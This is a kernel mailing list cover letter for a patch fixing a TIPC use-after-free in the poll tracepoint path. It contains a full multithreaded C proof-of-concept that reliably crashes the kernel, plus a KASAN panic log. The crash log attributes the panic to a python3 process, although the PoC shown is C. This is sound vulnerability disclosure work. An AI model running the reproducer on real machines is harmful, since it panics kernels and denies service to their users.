Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 831E946D096
	for <netdev@vger.kernel.org>; Tue, 21 Jul 2026 16:25:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.173
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784651105; cv=none; b=SGXkTo/tPKbc7ej1iCTK3RALQrBA6ZX7tkRZjfBGKfW7sxESZBr8Nk5IK5FhcJZBxariij8LOpDnIvxDKAK22GBn2K08maV7alCR0QdA4nAJYggLwTdKZWw6hLfd706n4B+NYqCQJWSCj8/ljonF9bXYZQDmjgQw/VIGCkWBr3Y=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784651105; c=relaxed/simple;
	bh=eqMhtKbz2btLZhOUt3iOuvZXwClc2X7wsrNb1YfqKjM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=JkF5A30qRf0ZRa6Eak/4/zR3hSQTGIqaepIhuZGWSI5c1rXCzNiaLMtB1v5tZeXuowwT1aaUGCRlDccaACoyjkPL0zLHPFUN19++nUyKl92SLJqA8LTS5tkLzU6FLqCRtWrmFRCrmfVgsAACnqkCd+F8jcLU5Lv8AsVdl2dhTYY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ru1gSvna; arc=none smtp.client-ip=209.85.214.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ru1gSvna"
Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2ccdb73f0e1so76447575ad.3
        for <netdev@vger.kernel.org>; Tue, 21 Jul 2026 09:25:03 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784651103; x=1785255903; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=yqJh352sY/ZfQidDDT3u2zB69lpFjzlJJC39de2AsD8=;
        b=ru1gSvnadbHVUfML73HuGpOyhOEo20zpxC3gv29FIh7+uJvUm7fWWE48Twl+cKRJWk
         HINY+uyjX5/gpHNSVG6v8dYOAGJiQR97JtDh5i5Y20AqCv4QkBAJAhHGXPlr2t7JfBYJ
         ylVtjA9xUp13gm9htFm7rnpGIz7tc65ue/OoaI85hRsVw1L4U/PxLe9qTyb8H/cBMNL2
         6o8ewvHgjBoFkt9zL+1yMbmJ8LhhhHfqf1KtLWv/Xly0iBVR/zqPKJ4xrNbX0XFBrPw8
         PfoE9lDBeHyXOoUhxbmxvmdnKxbFrPr5quIx44gkeuTRF7hgh21WM3x/bmLGSgm+zZcI
         v4ng==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784651103; x=1785255903;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=yqJh352sY/ZfQidDDT3u2zB69lpFjzlJJC39de2AsD8=;
        b=TPN3lo4FYqigxo1og+7kFtwnI4Ne8EAC5jrM0mP8qlDp6VXlYyajGbI7lHO8i+NMd5
         Amkxnxuj5PUzFfg8dA7ajSr8bQ3CUb/nsmdfqv4t3h3Gmpp3Jflk6/cHFF8PckIws/fI
         TrjWBmfebWArFe+hyUZyjwNigkVBZaoOZOkxN9C9KJ3R6QhYGPI4wIx+YhCcAAB7whqG
         sjx3a78Tngl1RSPUiLV7TR8LPRDyzk6hNjCrjbWaMv4y4VlY/PhBtIwsnj0BkLLhUy5x
         pbg87spi4xP13EWU9QLYX2EqzUVaRP5iu6q4SH+QgHfr49cQgMUTrq7OJ4AcbkB7ptQv
         YXGg==
X-Gm-Message-State: AOJu0YyJuHTooBgwzqFo9d7wZLBz5V++CaxOu4/gBZeOvEqkd3Tb8loO
	uj1PrZT+27c256y741ba8277x+SVMbHX8BVZ4xxdIpcihcg9Zif8G2MKrF18gdPl
X-Gm-Gg: AR+sD10E47hxHjG2Vg0SqWryHkQ851dwcHS5SXDYKCwERFpZdv2jmvemiUZlSE+177Q
	38YyvXcK0NrzzA/k7ACABGEfAXDOAqnlwZnHNdENVGdSBGfgVIuuyRLxGsSOmCK/n3nE7BlKDKT
	kYfidZ/j4vMX9cK98AIAYMseB4pzUwnoBiqUTFSi8zhmiTymJfCdwUkZWdy+EFwosd/YI7CogPk
	4209u7wG9mm6lW9lQNeC1VhSnjrPqYVM8lkfG7ebHOAp55vl7xUwABL6dlFcHsMaeQCRYrja2T3
	FJOhgr3D6mOWnjJa4D5hZJKtIncJVHbPIcPGeWLBRRwoZoje5kZ6LzSgOKYZAIex9+Tc7+RIJyM
	dOTHm1xem44wa2CA+w8ku1+INtGnvJsODi/t/f0tKq8PoHj3vLz9azANWUcoeZMHRnbz3GVKJ7u
	gXgj9xdcpr7HQfMm+5Bg==
X-Received: by 2002:a17:903:198c:b0:2ca:ed57:8586 with SMTP id d9443c01a7336-2cf3496bdd3mr206048835ad.23.1784651102363;
        Tue, 21 Jul 2026 09:25:02 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cf3471f42csm78836985ad.61.2026.07.21.09.24.57
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 21 Jul 2026 09:25:01 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org,
	tipc-discussion@lists.sourceforge.net
Cc: jmaloy@redhat.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	tuong.t.lien@dektech.com.au,
	ying.xue@windriver.com,
	vega@nebusec.ai,
	xizh2024@lzu.edu.cn,
	enjou1224z@gmail.com
Subject: [PATCH net v2 0/1] tipc: avoid use-after-free in poll trace queue dumps
Date: Wed, 22 Jul 2026 00:24:53 +0800
Message-ID: <cover.1784642230.git.xizh2024@lzu.edu.cn>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <xizh2024@lzu.edu.cn>

Hi Linux kernel maintainers,

We found and validated a bug in net/tipc/socket.c. The bug is
reachable by a local process that can create TIPC sockets and enable
TIPC tracepoints. We rebuilt and reran the reproducer with the updated
fix, and it preserves the trace output while removing the crash.

This series contains one patch:
  1/1 tipc: avoid use-after-free in poll trace queue dumps

Compared with v1, this revision follows the feedback that the trace path
should keep the queue/backlog information that is useful for debugging.
We also tested the suggested tipc_poll() change to switch this tracepoint
to TIPC_DUMP_NONE. That looks like it can avoid the reported poll stack,
but it only disables queue dumping at this one caller and does not change
the lifetime assumptions in tipc_sk_dump()/tipc_list_dump() themselves.
This v2 therefore tries to preserve the existing trace information while
serializing the poll trace snapshot with the socket lock, gated by
trace_tipc_sk_poll_enabled().

v1 Link: https://lore.kernel.org/all/24f7311aed0c9ff06b8ea982647b82bf543ec369.1784454542.git.xizh2024@lzu.edu.cn/

We provide bug details, reproducer steps, and a crash log below.

---- details below ----

Bug details:

TIPC socket tracepoints dump queue state through tipc_sk_dump(). Most
queue-dump callsites already serialize that walk under the socket lock
or sk->sk_lock.slock, but tipc_poll() calls
trace_tipc_sk_poll(..., TIPC_DUMP_ALL, ...) without holding either
lock.

That lets the poll trace path reach tipc_list_dump() and backlog
head/tail dumping while another context dequeues and frees an skb,
leaving the trace helper dereferencing a stale queue entry.

This v2 keeps the existing queue and backlog trace output, but
serializes the poll trace snapshot with the socket lock. The new
locking is gated on trace_tipc_sk_poll_enabled() so the hot poll path
does not take the lock when the tracepoint is disabled.

Reproducer:

Guest:
    gcc -O2 -pthread -Wall /root/tipc_poc.c -o /root/tipc_poc
    mount -t tracefs nodev /sys/kernel/tracing 2>/dev/null || true
    tipc node set identity 1.1.1
    timeout 30s /root/tipc_poc

Host:
    make O=/var/cache/linux-patch/tipc-list-dump-build-ext4 olddefconfig
    make O=/var/cache/linux-patch/tipc-list-dump-build-ext4 -j$(nproc) bzImage

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/tipc.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define TIPC_TYPE 5555

static volatile int stop_flag;
static int srv_fd, cli_fd;

static void write_file(const char *path, const char *s)
{
    int fd = open(path, O_WRONLY | O_TRUNC);
    if (fd < 0) { perror(path); exit(1); }
    if (write(fd, s, strlen(s)) < 0) { perror("write"); exit(1); }
    close(fd);
}

static void enable_trace(void)
{
    char path[256];
    write_file(TRACE "/tracing_on", "0\n");
    write_file(TRACE "/trace", "");
    const char *evs[] = {"tipc_sk_poll", "tipc_sk_filter_rcv", "tipc_sk_overlimit1", "tipc_sk_overlimit2"};
    for (int i = 0; i < 4; i++) {
        snprintf(path, sizeof(path), TRACE "/events/tipc/%s/enable", evs[i]);
        write_file(path, "1\n");
    }
    write_file(TRACE "/tracing_on", "1\n");
}

static void *sender(void *arg)
{
    char payload[4096];
    long cnt = 0;
    memset(payload, 'A', sizeof(payload));
    struct sockaddr_tipc dst = {0};
    dst.family = AF_TIPC;
    dst.addrtype = TIPC_SERVICE_ADDR;
    dst.scope = TIPC_CLUSTER_SCOPE;
    dst.addr.name.name.type = TIPC_TYPE;
    dst.addr.name.name.instance = 1;
    dst.addr.name.domain = 0;
    while (!stop_flag) {
        if (sendto(cli_fd, payload, sizeof(payload), 0, (struct sockaddr *)&dst, sizeof(dst)) >= 0)
            cnt++;
    }
    printf("sent %ld\n", cnt);
    return NULL;
}

static void *poller(void *arg)
{
    struct pollfd pfd = {.fd = srv_fd, .events = POLLIN};
    long cnt = 0;
    while (!stop_flag) {
        poll(&pfd, 1, 0);
        cnt++;
    }
    printf("poll %ld\n", cnt);
    return NULL;
}

static void *receiver(void *arg)
{
    char buf[4096];
    long cnt = 0;
    fcntl(srv_fd, F_SETFL, fcntl(srv_fd, F_GETFL) | O_NONBLOCK);
    while (!stop_flag) {
        ssize_t n = recv(srv_fd, buf, sizeof(buf), 0);
        if (n > 0) cnt++;
        else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {}
    }
    printf("recv %ld\n", cnt);
    return NULL;
}

int main(void)
{
    enable_trace();
    srv_fd = socket(AF_TIPC, SOCK_RDM, 0);
    if (srv_fd < 0) { perror("socket srv"); return 1; }
    int rcvbuf = 1 << 20;
    setsockopt(srv_fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    struct sockaddr_tipc srv = {0};
    srv.family = AF_TIPC;
    srv.addrtype = TIPC_SERVICE_RANGE;
    srv.scope = TIPC_CLUSTER_SCOPE;
    srv.addr.nameseq.type = TIPC_TYPE;
    srv.addr.nameseq.lower = 1;
    srv.addr.nameseq.upper = 1;
    if (bind(srv_fd, (struct sockaddr *)&srv, sizeof(srv)) < 0) { perror("bind"); return 1; }
    struct sockaddr_tipc name = {0};
    socklen_t namelen = sizeof(name);
    if (getsockname(srv_fd, (struct sockaddr *)&name, &namelen) < 0) { perror("getsockname"); return 1; }
    unsigned int portid = name.addr.id.ref;
    printf("server portid %u\n", portid);
    char filter[128];
    snprintf(filter, sizeof(filter), "%u 0 0 0 0\n", portid);
    write_file("/proc/sys/net/tipc/sk_filter", filter);

    cli_fd = socket(AF_TIPC, SOCK_RDM, 0);
    if (cli_fd < 0) { perror("socket cli"); return 1; }
    int imp = TIPC_CRITICAL_IMPORTANCE;
    setsockopt(cli_fd, SOL_TIPC, TIPC_IMPORTANCE, &imp, sizeof(imp));

    pthread_t th[3];
    pthread_create(&th[0], NULL, sender, NULL);
    pthread_create(&th[1], NULL, poller, NULL);
    pthread_create(&th[2], NULL, receiver, NULL);
    sleep(5);
    stop_flag = 1;
    for (int i = 0; i < 3; i++) pthread_join(th[i], NULL);
    system("tail -80 /sys/kernel/tracing/trace");
    return 0;
}
------END poc.c--------

----BEGIN crash log----
[  282.625215][ T9764] page_owner tracks the page as allocated
[  282.626124][ T9764] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd2cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9763, tgid 9760 (python3), ts 282622559122, free_ts 280322580853
[  282.628916][ T9764] page last free pid 9750 tgid 9750 stack trace:
[  282.630090][ T9764] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  282.631030][ T9764] CPU: 1 UID: 0 PID: 9764 Comm: python3 Not tainted 7.1.0-rc2 #10 PREEMPT(full)
[  282.632219][ T9764] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  282.633618][ T9764] Call Trace:
[  282.634056][ T9764]  <TASK>
[  282.634440][ T9764]  vpanic+0x6c3/0x790
[  282.634974][ T9764]  ? __pfx_vpanic+0x10/0x10
[  282.635573][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.636323][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.637064][ T9764]  ? irqentry_exit+0x24d/0x830
[  282.637683][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.638419][ T9764]  ? lockdep_hardirqs_on+0x7b/0x110
[  282.639112][ T9764]  ? tipc_skb_dump+0x14a4/0x14d0
[  282.639756][ T9764]  panic+0xca/0xd0
[  282.640261][ T9764]  ? __pfx_panic+0x10/0x10
[  282.640855][ T9764]  check_panic_on_warn+0x61/0x80
[  282.641542][ T9764]  end_report+0x13e/0x180
[  282.642133][ T9764]  kasan_report+0xf4/0x120
[  282.642764][ T9764]  ? tipc_skb_dump+0x14a4/0x14d0
[  282.643600][ T9764]  tipc_skb_dump+0x14a4/0x14d0
[  282.644400][ T9764]  tipc_list_dump+0x1b6/0x2a0
[  282.645093][ T9764]  tipc_sk_dump+0xa92/0xcc0
[  282.645700][ T9764]  ? trace_event_buffer_reserve+0x150/0x300
[  282.646510][ T9764]  trace_event_raw_event_tipc_sk_class+0x2c1/0x490
[  282.647402][ T9764]  ? __pfx_trace_event_raw_event_tipc_sk_class+0x10/0x10
[  282.648345][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.649114][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.649884][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.650654][ T9764]  ? __pfx_tipc_poll+0x10/0x10
[  282.651310][ T9764]  tipc_poll+0x290/0x590
[  282.651895][ T9764]  sock_poll+0x134/0x490
[  282.652492][ T9764]  do_sys_poll+0x507/0xbf0
[  282.653113][ T9764]  ? __pfx_do_sys_poll+0x10/0x10
[  282.653829][ T9764]  ? do_raw_spin_lock+0x12d/0x270
[  282.654597][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.655369][ T9764]  ? do_futex+0x1cd/0x230
[  282.655977][ T9764]  ? __pfx_do_futex+0x10/0x10
[  282.656614][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.657381][ T9764]  __x64_sys_poll+0x181/0x3e0
[  282.658035][ T9764]  ? __pfx___x64_sys_poll+0x10/0x10
[  282.658745][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
[  282.659515][ T9764]  ? rcu_is_watching+0x12/0xc0
[  282.660208][ T9764]  do_syscall_64+0x116/0xf80
[  282.660823][ T9764]  ? irqentry_exit+0x117/0x830
[  282.661476][ T9764]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  282.662266][ T9764] RIP: 0033:0x7f332e77d9ee
[  282.662861][ T9764] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
[  282.664714][ T9764] RSP: 002b:00007f332d6fdb58 EFLAGS: 00000246 ORIG_RAX: 0000000000000007
[  282.665298][ T9764] RAX: ffffffffffffffda RBX: 00007f332d6fe6c0 RCX: 00007f332e77d9ee
[  282.665838][ T9764] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 00007f332e604450
[  282.666442][ T9764] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  282.666986][ T9764] R10: 0000000000000000 R11: 0000000000000246 R12: 00007f332e1834c0
[  282.667563][ T9764] R13: 000000000c939210 R14: 00007f332d6fe640 R15: 00007f332e19af10
[  282.668176][ T9764]  </TASK>
[  282.669068][ T9764] Kernel Offset: disabled
[  282.669366][ T9764] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  tipc: avoid use-after-free in poll trace queue dumps

 net/tipc/socket.c | 8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)

-- 
2.43.0
